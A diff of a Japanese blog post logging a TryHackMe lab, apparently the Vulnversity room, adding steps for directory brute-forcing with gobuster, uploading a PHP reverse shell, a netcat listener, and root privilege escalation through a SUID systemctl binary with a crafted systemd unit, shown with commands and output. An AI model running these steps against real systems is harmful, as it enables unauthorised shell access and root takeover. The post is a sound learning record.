@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "Tryhackme log"
-date:   2021-11-15 00:00:00 +0900
+date:   2021-12-06 00:00:00 +0900
 categories: blog
 tags:
   - Security testing
@@ -43,6 +43,7 @@ tags:
 
 ## Locating directories using GoBuster
 
+* ブルートフォースツールでシェルのアップロードに使えるディレクトリ（パス）を見つけてみる
 * Golangの更新（https://golang.org/doc/install)go install github.com/OJ/gobuster/v3@latest
 * gobusterのインストール
   ```bash
@@ -51,7 +52,7 @@ tags:
 * wordlistを用意
 
   https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txtを利用
-  ```
+  ```bash
   curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -s > wordlist.txt
   ```
 * gobuster実行
@@ -80,4 +81,94 @@ tags:
     /js                   (Status: 301) [Size: 318] [--> http://x.x.x.x:3333/js/]
     ===============================================================
   ```
-- upload formからアップロードを試みる
+- /internalを見てみるとファイルアップロードできるページ
+
+## Compromise the webserver
+
+
+- Burp Suiteの初期設定
+  - https://bmf-tech.com/posts/GoogleChrome%E3%81%A7Burp%20Suite%E3%82%92%E4%BD%BF%E3%81%86%E6%89%8B%E9%A0%86
+
+- php-reverse-shell.phtml
+  - VPNつないでとあるIPにつなぐことで tun0 ipを確認し、ファイルを修正
+  - https://access.redhat.com/documentation/ja-jp/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/configuring-ip-tunnels_configuring-and-managing-networking
+
+- Reverse shell の確認方法
+  ```nc -l 1234 -n```
+
+
+## Privilege Escalation
+
+- SUIDが設定されているファイル
+  ```
+  $ find / -perm -4000
+  ```
+
+- SUIDとは
+  - 参考：[【初心者でもすぐわかる】SUIDとは？と設定方法](https://eng-entrance.com/linux-permission-suid)
+  - Set User ID
+    - 誰がそのファイルを実行してもセットされたユーザで実行される状態
+  - 例えば、passwdコマンドなどは所有者がrootになっておりSUIDが指定されている。この場合どのユーザがpasswdコマンドを実行しても必ずrootユーザが実行した状態となる。
+  - sフラグは実行権限のSUID
+    ```
+    ls -ls /bin/systemctl
+    648 -rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
+    ```
+
+- 挑戦メモ
+  - Unitファイルの指定ができる引数を使って独自のユニットを使えそう
+    - Unitファイル作成の参考：[systemdを用いたプログラムの自動起動 - Qiita](https://qiita.com/tkato/items/6a227e7c2c2bde19521c)
+    ```
+    systemctl -h
+     --root=PATH      Enable unit files in the specified root directory
+
+    cat << EOS >> /tmp/esca.service
+    [Unit]
+    Description = hello daemon
+
+    [Service]
+    ExecStart = /tmp/esca.sh
+    Restart = always
+    Type = simple
+
+    [Install]
+    WantedBy = multi-user.target
+    EOS
+
+    echo "cat /root/root.txt" > /tmp/esca.sh
+    chmod a+x /tmp/esca.sh
+
+    systemctl enable esca --root=/tmp/
+    # -> サービスが見つかりません
+
+    # サービス一覧
+    systemctl list-unit-files --type=service
+    ```
+
+
+
+- 断念。。。-> [Writeup](https://tryhackme.com/resources/blog/vulnversity)
+  ```
+  priv=$(mktemp).service
+  echo '[Service]
+  ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
+  [Install]
+  WantedBy=multi-user.target' > $priv
+
+  /bin/systemctl link $priv
+  Created symlink from /etc/systemd/system/tmp.u3BsWfqNDN.service to /tmp/tmp.u3BsWfqNDN.service.
+  /bin/systemctl enable --now $priv
+  Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.u3BsWfqNDN.service to /tmp/tmp.u3BsWfqNDN.service.
+
+  cat /opt/flag
+  ```
+- 学び
+  - `mktemp` コマンド
+    - /tmp/tmp.oSoIUcUO のようなファイルを作成する
+  - `systemctl` のオプション
+    - ```link + ABSOLUTE PATH```
+      - /etc/systemd/system/以下にシンボリックリンクを作成する
+      - /etc/systemd/system 以下への書き込み権限がなくてもユニットを追加できる
+    - `enable --now`
+      - 自動起動有効化と起動を同時にできる
+  - [GTFOBins](https://gtfobins.github.io/)
